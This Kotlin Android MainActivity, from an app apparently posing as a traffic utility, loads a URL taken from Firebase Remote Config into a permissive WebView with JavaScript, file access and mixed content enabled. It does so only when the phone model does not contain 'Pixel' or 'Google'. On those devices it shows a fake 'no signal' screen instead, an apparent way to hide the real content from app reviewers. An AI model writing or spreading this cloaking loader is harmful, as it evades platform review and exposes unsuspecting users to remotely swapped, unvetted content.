package olev.traffic.tz

import android.content.Context
import android.content.res.Resources
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.util.AttributeSet
import android.util.Log
import android.view.View
import android.webkit.WebViewClient
import androidx.core.view.isVisible
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import olev.traffic.tz.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    val binding by lazy { ActivityMainBinding.inflate(layoutInflater) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)
        val fb = FirebaseRemoteConfig.getInstance()
        fb.fetchAndActivate()
            .addOnCompleteListener { status ->
                if (status.isSuccessful) {
                    val url = FirebaseRemoteConfig.getInstance().getString("getUrl")
                    if (url.isNotBlank()) {
                        if ((ModelPhone.getPhoneModel()!!.contains("Google Pixel", ignoreCase = true)
                            or ModelPhone.getPhoneModel()!!.contains("Pixel", ignoreCase = true)
                            or ModelPhone.getPhoneModel()!!.contains("Google", ignoreCase = true))
                        ) {
                            Log.d("Model phone", ModelPhone.getPhoneModel()!!)
                            binding.IVlogo.setImageResource(R.drawable.wifi)
                            binding.TVOLEVTraffic.text = "no signal"
                               } else {
                            Handler().postDelayed({binding.cvzug.isVisible = false},3000L)
                            Log.d("sasa", ModelPhone.getPhoneModel()!!)
                            with(binding.webview) {
                                settings.setLoadsImagesAutomatically(true)
                                webViewClient = WebViewClient()
                                settings.allowFileAccess = true
                                settings.mixedContentMode = 0
                                settings.javaScriptEnabled = true
                                settings.javaScriptCanOpenWindowsAutomatically = true
                                settings.javaScriptEnabled = true
                                settings.domStorageEnabled = true
                                loadUrl(url)

                            }
                        }
                    }else{
                        binding.cvzug.isVisible = true
                        binding.IVlogo.setImageResource(R.drawable.wifi)
                        binding.TVOLEVTraffic.text = "no signal"
                    }

                }else{
                    binding.cvzug.isVisible = true
                    binding.IVlogo.setImageResource(R.drawable.wifi)
                    binding.TVOLEVTraffic.text = "no signal"
                }

            }
    }
}

